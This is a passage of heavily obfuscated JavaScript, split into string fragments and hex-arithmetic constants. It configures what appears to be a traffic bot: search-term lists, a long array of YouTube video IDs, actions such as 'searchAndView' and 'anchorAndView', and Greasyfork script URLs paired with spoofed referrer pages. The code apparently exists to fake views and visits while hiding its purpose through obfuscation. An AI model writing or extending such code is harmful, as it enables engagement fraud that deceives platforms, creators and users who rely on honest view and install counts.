'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith'][V(0x7) + 'nd'](-0xd9c + 0x1 * 0x3b2 + 0x9f4)), searchTerms['push']([U(0x4, 'wDO$') + 'spyder']['repeatExte' + 'nd'](0x1 * -0x869 + -0x21aa + 0x1 * 0x2a1d)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * 0x23c9 + 0x17 * -0x9 + 0x1 * -0x22f7);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    W(0xc) + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    W(0x11) + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    W(0x8) + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    V(0x16) + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    W(0x6) + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': V(0xd) + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + V(0xa)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': U(0x1, 'dmQ3') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + V(0xf) + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
